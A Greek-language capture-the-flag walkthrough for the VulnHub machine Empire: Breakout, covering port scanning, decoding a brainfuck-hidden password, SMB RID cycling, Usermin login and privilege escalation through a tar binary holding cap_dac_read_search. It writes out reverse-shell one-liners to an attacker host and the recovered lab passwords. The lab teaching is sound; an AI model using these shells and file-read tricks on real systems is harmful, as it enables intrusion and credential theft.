# Μηχάνημα 8 — Empire: Breakout

> **Θέση:** 8 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **028** από 708)
> **Πλήρες αγγλικό walkthrough:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Empire: Breakout |
| **Δημιουργός** | icex64 & Empire Cybersecurity |
| **Κυκλοφορία** | 21 Οκτωβρίου 2021 |
| **Λειτουργικό** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)**, **Usermin 1.830 (:20000)** |
| **VulnHub** | [entry/empire-breakout,751](https://vulnhub.com/entry/empire-breakout,751/) |
| **Σημαίες** | 2 — `/home/cyber/user.txt`, `/root/rOOt.txt` |
| **Εκτιμώμενος χρόνος** | 4–5 ώρες |

- ⚠️ **Σημείωση επαλήθευσης — ταυτότητα του μηχανήματος.** Κάθε πηγή που αντλήθηκε για αυτή την
  κάρτα επιβεβαιώνει τις παραπάνω τιμές: η Security Akademeia παραθέτει την καταχώριση του VulnHub
  (κυκλοφορία **21 Οκτωβρίου 2021**, `02-Breakout.zip`) και τα screenshots του 0bfxgh0st δείχνουν
  χρονοσημάνσεις αρχείων Οκτωβρίου 2021. Και τα πέντε writeups τεκμηριώνουν τον χρήστη **`cyber`**,
  το σχόλιο brainfuck και ένα *capability* στο `/home/cyber/tar`. Κανένα δεν αναφέρει κυκλοφορία του
  2018, λογαριασμό `c0mput3r`, SUID script `customBackup` ή αρχείο `kalamid` — αν συναντήσετε αυτές
  τις λεπτομέρειες σε κάποια άλλη σύνοψη, ανήκουν σε **διαφορετικό** μηχάνημα (αναζήτηση για αυτές
  μαζί με αυτό το box δεν βρήκε τίποτα), οπότε μην τις περιμένετε σε αυτό το VM.

---

## Πώς να χρησιμοποιήσετε αυτή την κάρτα

Ίδιο πρότυπο: **Α** (μέθοδος + θεωρία) · **Β** (το μηχάνημα) · **Γ** (κάθε εντολή, λογικά).
Η νέα θεωρία εδώ: **γιατί το `-p-` μαζί με το `-sV` δεν είναι διαπραγματεύσιμο**, **Webmin vs
Usermin**, η **brainfuck** (γλώσσα, όχι κωδικοποίηση), **SMB null session + RID cycling**, και τα
**file capabilities** ως διαφορετικό — και λεπτότερο — μοντέλο προνομίων από το SUID.

---

# Μέρος Α — Η μέθοδος (θεωρία)

## Α.1 Γιατί το `-p-` (μαζί με το `-sV`) δεν είναι διαπραγματεύσιμο

Ό,τι έχει ενδιαφέρον σε αυτό το box κάθεται σε δύο ψηλές θύρες — τις **10000** και **20000** (το
μυστικό στην 80, τα ονόματα χρηστών στις 139/445). Η σάρωση όλων των θυρών με ανίχνευση έκδοσης
είναι συνήθεια, όχι βελτιστοποίηση: κοστίζει λίγα λεπτά, και μια θύρα που χάθηκε κοστίζει την
επιχείρηση.

> ⚠️ **Σημείωση επαλήθευσης — τι δείχνει πραγματικά μια προεπιλεγμένη σάρωση εδώ.** Μια παλαιότερη
> εκδοχή αυτής της κάρτας ισχυριζόταν ότι μια προεπιλεγμένη σάρωση των top-1.000 βλέπει μόνο
> 80/139/445. Ελέγχθηκε απέναντι στον πίνακα συχνοτήτων `nmap-services` του ίδιου του nmap — **η
> θύρα 10000 κατατάσσεται ≈31η και η θύρα 20000 ≈541η** από τις 65.535, και οι δύο μέσα στο
> προεπιλεγμένο σύνολο — και απέναντι στο πλήρες lab writeup, που συμφωνεί: ένα απλό `nmap TARGET`
> *τις εμφανίζει* και τις δύο. Αυτό που κρύβει ακόμη μια γυμνή σάρωση χωρίς έκδοση είναι **τι είναι**
> — εμφανίζονται ως ανώνυμη `http` μέχρι να προσθέσετε `-sV`. Και στον πραγματικό κόσμο οι
> ενδιαφέρουσες κονσόλες κάθονται στις 8443, 9090, 10443, 3000, 15672 — θύρες που το top-1.000
> πραγματικά χάνει. Άρα σαρώνετε και τις 65.535 θύρες ούτως ή άλλως: **ένα false negative είναι
> χειρότερο από μια αργή σάρωση.**

**Παγίδα αρχαρίου:** «η σάρωση δεν βρήκε τίποτα» σημαίνει σχεδόν πάντα «δεν ρώτησα τι τρέχουν οι
θύρες».

## Α.2 Webmin vs Usermin — ίδια οικογένεια, διαφορετικό κοινό

| | **Webmin** | **Usermin** |
| --- | --- | --- |
| Διαχειρίζεται | **το σύστημα** | **τον μεμονωμένο χρήστη** |
| Περιμένει | λογαριασμό **διαχειριστή** | έναν **απλό** λογαριασμό |
| Εδώ | θύρα **10000** (1.981) | θύρα **20000** (1.830) |

Το **MiniServ** είναι ο δικός του Perl HTTP daemon του Webmin — και προσέξτε την παγίδα: το nmap
βαφτίζει **και** τις δύο θύρες `MiniServ … (Webmin httpd)`, επειδή το Usermin το ξαναχρησιμοποιεί. Ο
*τίτλος της σελίδας σύνδεσης* λέει την αλήθεια: τα screenshots της Security Akademeia δείχνουν
**"Login to Webmin"** στο 10000, **"Login to Usermin"** στο 20000. Γι' αυτό ο απλός λογαριασμός
`cyber` **αποτυγχάνει** στο 10000 και **πετυχαίνει** στο 20000. **Το να ξέρετε ποιο προϊόν είναι σε
ποια θύρα σας λέει ποια διαπιστευτήρια ανήκουν εκεί.**

## Α.3 Brainfuck: γλώσσα, όχι κωδικοποίηση

Ένα string φτιαγμένο σχεδόν μόνο από `> < + - . , [ ]` είναι **brainfuck**, μια **Turing-complete**
γλώσσα με οκτώ εντολές, που λειτουργεί σε μια «ταινία» από byte-cells:

| `>` `<` | κίνησε τον δείκτη δεξιά / αριστερά |
| `+` `-` | αύξησε / μείωσε το τρέχον κύτταρο |
| `.` `,` | τύπωσε το κύτταρο ως byte / διάβασε ένα byte |
| `[` `]` | άλμα εμπρός αν το κύτταρο είναι 0 / πίσω αν είναι μη-μηδενικό |

Είναι **πρόγραμμα**, άρα το **τρέχετε**, δεν το «αποκωδικοποιείτε». Φαίνεται αδιαπέραστο και λύνεται
σε λιγότερο από δεύτερο. **Αναγνωρίστε πρώτα το σύνολο χαρακτήρων:** μόνο `+ - < > . , [ ]` →
brainfuck· `A–Z 2–7` + `=` → base32· `A–Z a–z 0–9 + /` + `=` → base64· ζυγό `0–9a-f` → hex. Τα
writeups το αναγνώρισαν με online αναλυτές — τον [αναγνωριστή κρυπτογραφημάτων του dcode.fr](https://www.dcode.fr/cipher-identifier),
το [decode.fr](https://www.dcode.fr/brainfuck-language) και τον [αποκωδικοποιητή Ook! του splitbrain.org](https://www.splitbrain.org/services/ook)
— εντάξει για αυτό το δημόσιο σχόλιο· **για οτιδήποτε ευαίσθητο, τρέξτε έναν interpreter τοπικά**
(το Βήμα 2 παραδίδει έναν).

## Α.4 SMB null session και RID cycling

Το Samba ταυτοποιεί κάθε λογαριασμό με **SID** όπως `S-1-22-1-1000`, όπου ο τελευταίος αριθμός είναι
το **RID**. Το πεδίο `S-1-22-1` είναι ο τρόπος που το Samba χαρτογραφεί λογαριασμούς **Unix** σε SIDs
τύπου Windows: ο root παίρνει RID **0**, ο πρώτος συνηθισμένος ανθρώπινος λογαριασμός RID **1000**.
Αν το SMB επιτρέπει **null session** (κενά διαπιστευτήρια), μπορείτε να ρωτήσετε *«ποιος είναι το
RID 1000; 1001;»* και να πάρετε **ονόματα χρηστών πίσω** — **χωρίς κωδικό, χωρίς exploit, μόνο λάθος
ρύθμιση.** Το προεπιλεγμένο εύρος ανίχνευσης του enum4linux είναι `500-550,1000-1050`, γι' αυτό
ακριβώς προσγειώνεται στο RID 1000· ένας χειροκίνητος βρόχος (Βήμα 3) δείχνει επίσης τους
λογαριασμούς συστήματος του Debian (`root` RID 0, `backup` RID 34, …) όπου δεν συνδέεται κανείς
άνθρωπος.

## Α.5 Capabilities: λεπτότερο μοντέλο προνομίων από το SUID

Το **SUID root** παρέχει **ό,τι μπορεί να κάνει ο root**. Ένα **capability** παρέχει **μία
συγκεκριμένη** άδεια πυρήνα. Το `cap_dac_read_search` παρακάμπτει τους **ελέγχους ανάγνωσης αρχείων
και αναζήτησης καταλόγων** (το «discretionary access control»). Δεν σας αφήνει να γράψετε ή να
εκτελέσετε — αλλά σας αφήνει να **διαβάσετε τα πάντα**, άρα το `/etc/shadow`, τα κλειδιά του root,
ή ένα backup με κωδικό. Το επίθημα `=ep` είναι η σημειογραφία σημαιών του libcap: **`p`** = permitted
(η διεργασία μπορεί να κατέχει το δικαίωμα από το exec) και **`e`** = effective (ο πυρήνας το
επιβάλλει αυτή τη στιγμή).

> **Ποτέ μην σαρώνετε μόνο για SUID.** Το `getcap -r /` ανήκει στη λίστα ελέγχου **δίπλα** στο
> `find -perm -4000`.

## Α.6 Γιατί το `tar` θέλει **δύο** βήματα

Το `tar` δεν μπορεί να κάνει `cat` — μπορεί μόνο να **αρχειοθετήσει** και να **εξαγάγει**. Η
εξαγωγή όμως **αλλάζει τον ιδιοκτήτη**: το `tar` αφαιρεί την αρχική `/`, οπότε το αρχείο
αναδημιουργείται **σε σχέση με τον τρέχοντα κατάλογό σας** και ανήκει σε **εσάς** — ως μη-root δεν
θα μπορούσατε ούτως ή άλλως να κάνετε chown, και το GNU tar αναθέτει σιωπηλά το δικό σας uid
(ο root, αντίθετα, παίρνει συμπεριφορά `--same-owner` από προεπιλογή). Το capability επέτρεψε στο tar
να το **διαβάσει**· η εξαγωγή σας έδωσε **αναγνώσιμο αντίγραφο**. Γι' αυτό δύο βήματα, όχι ένα.

---

# Μέρος Β — Το μηχάνημα

## Β.1 Τι θα μάθετε

1. Να σαρώνετε **και τις 65.535 θύρες με ανίχνευση έκδοσης** και να αναγνωρίζετε `MiniServ` → Webmin/Usermin.
2. Να ξεχωρίζετε το **Webmin** από το **Usermin** — ακόμη και όταν το nmap τα βαφτίζει πανομοιότυπα.
3. Να αποκωδικοποιείτε **brainfuck** τοπικά.
4. Να απαριθμείτε χρήστες SMB με **`enum4linux`** και να καταλαβαίνετε το **RID cycling**.
5. Να παίρνετε κανάλι εντολών από **web κονσόλα διαχείρισης** — και γιατί αυτό **δεν** είναι αληθινό κέλυφος.
6. Να χρησιμοποιείτε **`getcap -r /`** και να ερμηνεύετε `cap_dac_read_search=ep`.
7. Να χρησιμοποιείτε το **`tar`** για να παρακάμψετε περιορισμό ανάγνωσης DAC, και γιατί η εξαγωγή αλλάζει τον ιδιοκτήτη.
8. Να αναγνωρίζετε το μοτίβο «**plaintext κωδικός σε κατάλογο backup**».

## Β.2 Ο χάρτης

| Στάδιο | Πού |
| --- | --- |
| Ψηλές θύρες διαχείρισης | **10000** (Webmin), **20000** (Usermin) |
| Συσκότιση ως ψευδο-προστασία | brainfuck σε σχόλιο HTML της default σελίδας |
| **SMB null + RID cycling** | 139/445 → χρήστης **`cyber`** |
| Εκτεθειμένες κονσόλες | Webmin **και** Usermin προσβάσιμα από το δίκτυο |
| Κονσόλα → κανάλι εντολών | **Usermin Command Shell** ως `cyber` |
| **Capability** | `/home/cyber/tar` με `cap_dac_read_search=ep` |
| Plaintext μυστικό σε backup | `/var/backups/.old_pass.bak` |

## Β.3 Πριν ξεκινήσετε

- [01 — Βάσεις](<../01-Βάσεις-Δικτύωση-και-Αναγνώριση.md>) §6–§7 (πλήρης σάρωση θυρών, τι προσθέτει το `-sC`).
- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) **§2** (SMB, null sessions, RID cycling).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) **§3** (capabilities) — όλη η αναβάθμιση.

**Απαντήστε πριν:**
1. Η γυμνή σάρωσή σας δείχνει 80, 139, 445, 10000, 20000 — αλλά χωρίς εκδόσεις. Τι προσθέτετε, και
   γιατί μετράει; Τι θα είχατε χάσει αν οι κονσόλες ήταν στις 8443 ή 9090;
2. Τι είναι το **RID cycling**, και ποια ρύθμιση SMB πρέπει να ισχύει για να δουλέψει;
3. Ένα κέλυφος από web κονσόλα διαχείρισης είναι το ίδιο με SSH; Δώστε δύο διαφορές.
4. Τι επιτρέπει το `cap_dac_read_search` που το συνηθισμένο Unix απαγορεύει;
5. Όταν κάνετε `tar` σε αρχείο root και το εξάγετε ως εσείς, ποιος κατέχει το αντίγραφο; Γιατί;

---

# Μέρος Γ — Η διαδρομή, βήμα-βήμα

## Βήμα 1 — Σάρωση

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt TARGET
```

- `-p-` → και οι **65.535** TCP θύρες · `-sV` → αποτυπώνει εκδόσεις μέσω banner/probe ·
  `-sC` → ασφαλή **προεπιλεγμένα scripts** (προσθέτει `http-title`, `nbstat`, `smb2-security-mode`, …) ·
  `-T4` → επιθετικό αλλά λογικό timing (`-T5` εγκαταλείπει αργές απαντήσεις → false negatives) ·
  `-oN` → αποθήκευση αναγνώσιμης αναφοράς · `sudo` → ενεργοποιεί τη γρηγορότερη SYN σάρωση.

```text
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
```

**Πώς το διαβάζετε.** Πρώτα η γραμμή που όλοι προσπερνούν: `65535 − 65530 = 5` ενδιαφέρουσες θύρες,
και το `(reset)` σημαίνει ότι ο host είναι **πάνω και απαντά** — όχι πίσω από firewall. Έπειτα
τέσσερις υπηρεσίες: το **`MiniServ`** είναι ο δικός του HTTP server του Webmin, άρα οι 10000/20000
είναι **δύο κονσόλες διαχείρισης** — και **δύο διαφορετικές εκδόσεις** (`1.981` και `1.830`), που
υποδηλώνει δύο διαφορετικά προϊόντα. Το `Samba 4.6.2` σε 139 *και* 445 σημαίνει NetBIOS-over-TCP
και απευθείας SMB· το script του `-sC` αναφέρει επίσης `Message signing enabled but not required` —
ένα κενό σκλήρυνσης που αξίζει να σημειώσετε για το Μέρος Δ. **Δεν υπάρχει SSH καθόλου**, άρα
οποιοδήποτε κέλυφος πρέπει να έρθει από τις web κονσόλες.

## Βήμα 2 — Πηγαίος κώδικας → brainfuck

Η default σελίδα δεν αποδίδει τίποτα χρήσιμο — **κοιτάξτε τον πηγαίο κώδικα** και κατεβείτε στο
τέλος, όπου ένα σχόλιο HTML `<!-- … -->` κρύβει εκατοντάδες χαρακτήρες μόνο από `+ - < > . , [ ]`:

```bash
curl -s http://TARGET/ | tail -25
curl -s http://TARGET/ | grep -oE '[-+<>.,\[\]]{50,}' > program.txt
```

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->
```

**Πώς το διαβάζετε.** Το `tail -25` επειδή το σχόλιο κάθεται στο τέλος της σελίδας (το «It's
encrypted» του δημιουργού είναι αστείο — ό,τι είναι σε HTML είναι **δημόσιο**: τα σχόλια απλώς δεν
αποδίδονται). Το `grep -oE … > program.txt` κρατά μόνο τις ταιριαστές ακολουθίες: το `-o` τυπώνει
μόνο τα matches, το `-E` ενεργοποιεί extended regex, το `{50,}` απαιτεί 50+ χαρακτήρες ώστε να μην
πιάνει τυχαία στίξη. Αυτό είναι **πρόγραμμα**, άρα το τρέχετε (Α.3) — δεν υπάρχει προεγκατεστημένος
interpreter, οπότε γράψτε έναν μικροσκοπικό (είναι και ο γρηγορότερος τρόπος να *νιώσετε* τι σημαίνει
«Turing-complete σε ταινία κυττάρων»):

```bash
cat > bf.py <<'EOF'
import sys
prog = [c for c in open(sys.argv[1]).read() if c in '+-<>.,[]']
tape, ptr, ip, out, stack = [0] * 30000, 0, 0, [], []
jump = {}
for i, c in enumerate(prog):                 # pass 1: match every [ with its ]
    if c == '[': stack.append(i)
    elif c == ']': j = stack.pop(); jump[i], jump[j] = j, i
while ip < len(prog):                        # pass 2: one instruction per step
    c = prog[ip]
    if c == '>': ptr += 1
    elif c == '<': ptr -= 1
    elif c == '+': tape[ptr] = (tape[ptr] + 1) % 256
    elif c == '-': tape[ptr] = (tape[ptr] - 1) % 256
    elif c == '.': out.append(chr(tape[ptr]))          # ',' unused: this program reads no input
    elif c == '[' and not tape[ptr]: ip = jump[ip]     # at 0, skip forward past the ]
    elif c == ']' and tape[ptr]: ip = jump[ip]         # non-zero, jump back to the [
    ip += 1
print(''.join(out))
EOF
python3 bf.py program.txt
```

```text
.2uqPEfj3D<P'a-3
```

**Πώς το διαβάζετε.** 16 χαρακτήρες, μικτά πεζά/κεφαλαία με ψηφία και σύμβολα: **ένας κωδικός**. Η
ταινία των 30.000 κυττάρων, ο δείκτης και ο πίνακας αναπήδησης δύο περασμάτων είναι όλη η γλώσσα.
**Τρέξτε το τοπικά** — ποτέ μην κολλάτε δεδομένα πελάτη σε τρίτο interpreter.

## Βήμα 3 — SMB: ανώνυμη πρόσβαση και RID cycling

```bash
enum4linux -a TARGET
```

Το `-a` σημαίνει «κάνε τα πάντα»: shares, policy, groups, και το RID walk (Α.4). Τι μετράει:

```text
[+] Server TARGET allows sessions using username '', password ''
...
//TARGET/print$    Mapping: DENIED, Listing: N/A
...
RID Range ........ 500-550,1000-1050
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cyber (Local User)
```

**Πώς το διαβάζετε — τρία ξεχωριστά αποτελέσματα.** Η **null session επιτρέπεται** (`username '',
password ''` είναι η γλώσσα του SMB για κενά διαπιστευτήρια). **Και τα δύο shares είναι `DENIED`**
— η ανώνυμη πρόσβαση *αρχείων* είναι κλειστή, σωστά αδιέξοδο. **Αλλά το SID lookup πέτυχε**: μια
ανώνυμη συνεδρία μπορεί ακόμη να μετατρέψει SIDs σε ονόματα, και το RID 1000 είναι ο πρώτος
πραγματικός λογαριασμός → **`cyber`**, που με τον κωδικό του brainfuck σας δίνει ζεύγος
διαπιστευτηρίων. Εναλλακτικές: `rpcclient -U "" -N TARGET` (`lookupsids S-1-22-1-1000`),
`smbclient -L TARGET -N` (εμφανίζει `print$` και `IPC$`, mapping ακόμη αρνητικό), ή
`crackmapexec smb TARGET --rid-brute 2000`.

## Βήμα 4 — Ποια κονσόλα δέχεται το διαπιστευτήριο

Πρώτα η θεωρία (Α.2): δοκιμάστε το ζεύγος σε **και** τις δύο κονσόλες. Η διαδρομή μέσω browser είναι
ευκολότερη — επισκεφθείτε `http://TARGET:10000/` και θα πάρετε σφάλμα εγγράφου / ανακατεύθυνση σε
**https** (δεχθείτε την προειδοποίηση αυτο-υπογεγραμμένου πιστοποιητικού σε lab), μετά συνδεθείτε. Η
scriptable διαδρομή:

```bash
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'webmin 10000: %{http_code} %{redirect_url}\n'
curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'usermin 20000: %{http_code} %{redirect_url}\n'
```

**Πώς το διαβάζετε.** `-s` σιωπηλά, `-k` δέχεται το αυτο-υπογεγραμμένο πιστοποιητικό, `-d` το σώμα
του POST (βάλτε το σε εισαγωγικά — ο κωδικός περιέχει `'` και `<`), `-o /dev/null` πετά το σώμα,
`-w` τυπώνει τον κωδικό κατάστασης **και πού σας προσγείωσε η σύνδεση**: επιστροφή στη σελίδα
σύνδεσης σημαίνει αποτυχία, ανακατεύθυνση μέσα στην κονσόλα σημαίνει ότι στήθηκε συνεδρία. Η
πραγματική απόδειξη είναι οπτική — η Security Akademeia και ο CyberArri δείχνουν και οι δύο το
**Webmin :10000 να απορρίπτει τον `cyber`, το Usermin :20000 να τον δέχεται** — ακριβώς σωστό: το
**Webmin διαχειρίζεται το σύστημα** (άρα περιμένει διαχειριστή), το **Usermin εξυπηρετεί μεμονωμένους
χρήστες** (άρα ένας απλός λογαριασμός δουλεύει).

## Βήμα 5 — Foothold: το Usermin Command Shell

Συνδεθείτε στο `https://TARGET:20000/` και βρείτε **Commands → Command Shell** (κάτω αριστερά ως
εικονίδιο `>_` — εύκολο να το χάσετε· σε μερικά skins είναι πίσω από το μενού hamburger). Εκτελεί
εντολές OS στον browser:

| Εντολή | Έξοδος |
| --- | --- |
| `id` | `uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)` |
| `ls -la` | `tar  user.txt  .bashrc  .profile  .tmp` |
| `cat user.txt` | **flag 1 of 2** (`/home/cyber/user.txt`) |
| `sudo -l` | `bash: sudo: command not found` |

**Πώς το διαβάζετε.** `id`: uid/gid 1000 είναι απλός λογαριασμός, και αυτή η μακριά λίστα `groups=`
είναι όλα σχεδόν-υλικού ομάδες — τίποτα με προνόμια, ούτε `sudo`/`wheel`. Τρία γεγονότα οδηγούν τα
υπόλοιπα: **το `sudo` δεν είναι εγκατεστημένο** (όλη η οικογένεια privesc μέσω «λάθος ρύθμισης sudo»
βγαίνει από το τραπέζι), η **σημαία χρήστη είναι ήδη εντός εμβέλειας**, και **ένα `tar` κάθεται στο
home ενός χρήστη** — ένα εκτελέσιμο 531 KB στο `~` είναι ανωμαλία. Κρατήστε το.

## Βήμα 6 — Αποκτήστε πραγματικό κέλυφος

Ένα πλαίσιο εντολών browser δεν δίνει TTY, job control, ούτε tab completion — και η Security
Akademeia αναφέρει ότι το `su` αποτυγχάνει εκεί με `Authentication failure`. **Ελέγξτε τι έχει ο
στόχος πριν διαλέξετε payload:**

```bash
which bash sh python3 perl nc curl wget gcc
```

```text
/bin/bash /bin/sh /usr/bin/python3 /usr/bin/perl /usr/bin/curl /usr/bin/wget /usr/bin/gcc
```

**Πώς το διαβάζετε.** Το `which` τυπώνει πού ζει κάθε εντολή· ό,τι λείπει από την έξοδο λείπει από
τον στόχο — τρέξτε το στο **δικό σας** VM, αυτός ο πίνακας είναι μόνο παράδειγμα. **Δεν υπάρχει
`nc`** παραπάνω, άρα χρησιμοποιήστε την υποστήριξη TCP του ίδιου του bash. (Το writeup του CyberArri
έτρεξε `nc <kali> 4444 -e /bin/bash` από το web box με επιτυχία, άρα κάποιες εικόνες *το* έχουν — η
δική σας έξοδος `which` είναι η αυθεντία.) Στο Kali **πρώτα**, ανοίξτε τον listener:

```bash
nc -lvnp 4444
```

`-l` listen · `-v` αναφέρει τη σύνδεση · `-n` παράλειψη DNS · `-p` θύρα. **Listener πριν το payload**
— ένα reverse shell που εκτοξεύεται σε νεκρή θύρα απλώς πεθαίνει. Έπειτα, στο πλαίσιο του Usermin:

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

**Πώς το διαβάζετε, κομμάτι-κομμάτι.** `bash -i` = διαδραστικό κέλυφος· το `/dev/tcp/HOST/PORT` είναι
**ψευδο-διαδρομή μόνο του bash** — ανοίγοντάς την, το bash ανοίγει αυτή τη σύνδεση TCP (το απλό POSIX
`sh`, π.χ. το dash του Debian, *δεν* το έχει, αν και το writeup του Ra-Sec δείχνει το
`sh -i >& /dev/tcp/…` να δουλεύει επίσης — προτιμήστε `bash` για σιγουριά)· το `>&` αντιγράφει το
stdout (και το stderr) στο socket· το `0>&1` αντιγράφει το stdin από το ίδιο socket, ώστε είσοδος,
έξοδος και σφάλματα να ταξιδεύουν όλα σε μία σύνδεση. Θα πρέπει να δείτε:

```text
connect to [ATTACKER] from (UNKNOWN) [TARGET] 49224
bash: cannot set terminal process group (4404): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$
```

Οι δύο προειδοποιήσεις `bash:` είναι **αναμενόμενες** — είναι το TTY που λείπει και διαμαρτύρεται.
Διορθώστε το τώρα:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z ; on Kali:
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**Γραμμή-γραμμή:** το `pty.spawn` δίνει στο κέλυφος του στόχου ένα pseudo-terminal (prompts, tab
completion)· το `Ctrl+Z` αναστέλλει τη σύνδεση πίσω στο *δικό σας* κέλυφος Kali· το `stty raw -echo`
σταματά το Kali από το να επεξεργάζεται διπλά τα πλήκτρα και το `fg` επαναφέρει το κέλυφος του
στόχου στο προσκήνιο· το `TERM` μαζί με τις διαστάσεις διορθώνει χρώμα και αναδίπλωση γραμμών. Η
παραλλαγή του Ra-Sec προσθέτει `reset` μετά το `fg` — εξίσου καλή. Χωρίς αυτή την αναβάθμιση, οι
κωδικοί και το `vim` συμπεριφέρονται μπερδεμένα.

## Βήμα 7 — Η αναβάθμιση **δεν** είναι SUID

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

**Πώς το διαβάζετε.** Το `find /` διατρέχει όλο το filesystem, το `-perm -4000` ταιριάζει αρχεία με
το **SUID bit** (τρέχουν ως ο ιδιοκτήτης του αρχείου — συνήθως root), το `-type f` παραλείπει
καταλόγους, το `2>/dev/null` κρύβει την πλημμύρα σφαλμάτων «permission denied» από φακέλους μόνο για
root. Το `getcap -r /` είναι η ίδια σάρωση για **capabilities** — τυπώνει ονόματα αρχείων μαζί με
σημαίες όπως `=ep` (Α.5):

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
... (all stock)
```
```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

Όλες οι SUID εγγραφές είναι **stock** (το προεπιλεγμένο σύνολο του Debian, γραμμένο προσεκτικά και
μη εκμεταλλεύσιμο εδώ) — όταν η λίστα SUID είναι βαρετή, προχωρήστε στο επόμενο vector. Το
`/usr/bin/ping cap_net_raw` είναι **φυσιολογικό** (τα raw sockets χρειάζονται νόμιμα προνόμιο). Το
**`cap_dac_read_search`** είναι αυτό που μετράει (Α.5). Τώρα κοιτάξτε το binary από κοντά:

```bash
ls -l /home/cyber/tar && getcap /home/cyber/tar
md5sum /home/cyber/tar; md5sum /bin/tar
```

```text
-rwxr-xr-x 1 root root 531928 Oct 19 2021 /home/cyber/tar
/home/cyber/tar cap_dac_read_search=ep
2c07f16d9be6d1bef784bd37928f18c1  /home/cyber/tar
2c07f16d9be6d1bef784bd37928f18c1  /bin/tar
```

**Δύο αναγνώσεις.** Πρώτα το mode: **`-rwxr-xr-x`, όχι `-rwsr-xr-x`** — δεν υπάρχει SUID bit, γι'
αυτό ακριβώς το `find -perm -4000` δεν βρήκε τίποτα. Έπειτα τα hashes: **byte-identical με το
`/bin/tar` της διανομής** (Security Akademeia) — το binary είναι αθώο· τα *μεταδεδομένα του
capability* είναι ολόκληρη η ευπάθεια. Αρχείο root-owned, εκτελέσιμο από όλους + ένα στενό δικαίωμα =
ένας **root-powered file reader** για όποιον το τρέξει.

## Βήμα 8 — Εξαγωγή του κωδικού — τα δύο βήματα

```bash
ls -la /var/backups/
cat /var/backups/.old_pass.bak
```

```text
-rw------- 1 root root 17 Oct 20  2021 .old_pass.bak
cat: /var/backups/.old_pass.bak: Permission denied
```

**Πώς το διαβάζετε.** Τρεις παγίδες σε μία λίστα: είναι **dot-file** (ένα γυμνό `ls` το κρύβει —
γι' αυτό το `-la`), είναι mode **600 owned by root** (άρα το `cat` αποτυγχάνει στον έλεγχο DAC
read — ο πυρήνας συγκρίνει το *δικό σας* uid με το mode), και κάθεται σε κατάλογο **backups** με
όνομα σε σχήμα κωδικού. Τα backups συγκεντρώνουν παλιά μυστικά — να κοιτάτε πάντα εκεί πρώτα. Είναι
17 bytes: κωδικός 16 χαρακτήρων συν newline. Το `tar` δεν κάνει `cat`, οπότε χρησιμοποιήστε **και τα
δύο μισά**:

```bash
./tar -cf backup.tar /var/backups/.old_pass.bak
./tar -xf backup.tar
cat var/backups/.old_pass.bak
```

```text
./tar: Removing leading '/' from member names
```
```text
Ts&4&YurgtRX(=~h
```

**Πώς το διαβάζετε.** Προσέξτε το `./` — ένα γυμνό `tar` θα έτρεχε **το `/bin/tar` του συστήματος
χωρίς το capability** και θα έπεφτε στο ίδιο Permission denied. Το `-c` δημιουργεί αρχείο, το `-f`
το ονομάζει: το capability επιτρέπει στο `./tar` να **διαβάσει** το αρχείο μόνο για root. **Η
προειδοποίηση είναι ο μηχανισμός:** το GNU tar αφαιρεί την αρχική `/`, οπότε η αποθηκευμένη διαδρομή
είναι *σχετική* — `var/backups/.old_pass.bak` — και η εξαγωγή την αναδημιουργεί **μέσα στον τρέχοντα
κατάλογό σας**, **δική σας** (Α.6). Τώρα το `cat` δουλεύει επειδή το αντίγραφο περνά τον έλεγχο DAC.

```bash
su root
id
cat /root/rOOt.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Πώς το διαβάζετε.** Το `su` αντικαθιστά τον χρήστη σας· ζητά τον κωδικό του root **χωρίς να τον
εμφανίζει** (τίποτα δεν φαίνεται όσο πληκτρολογείτε — αυτό είναι φυσιολογικό· ειδικοί χαρακτήρες
όπως `& ( = ~` πληκτρολογούνται αυτούσιοι σε prompt κωδικού — μετράνε μόνο μέσα σε γραμμές εντολών
shell). Δύο παγίδες: το prompt μπορεί να **μην αλλάξει ορατά** μετά την επιτυχία — τρέξτε `id` για
επιβεβαίωση (Security Akademeia)· και αν είστε ακόμη μέσα στο πλαίσιο browser του Usermin παίρνετε
`Authentication failure` αντ' αυτού — ξανακάντε το Βήμα 6. Το αρχείο σημαίας είναι το `rOOt.txt` —
**τα κεφαλαία μετράνε στο Linux**: το `cat r00t.txt` της Security Akademeia επέστρεψε `No such file
or directory`, άρα `ls -la` πριν υποθέσετε ένα όνομα.

## Βήμα 9 — Τι άλλο θα μπορούσε το capability

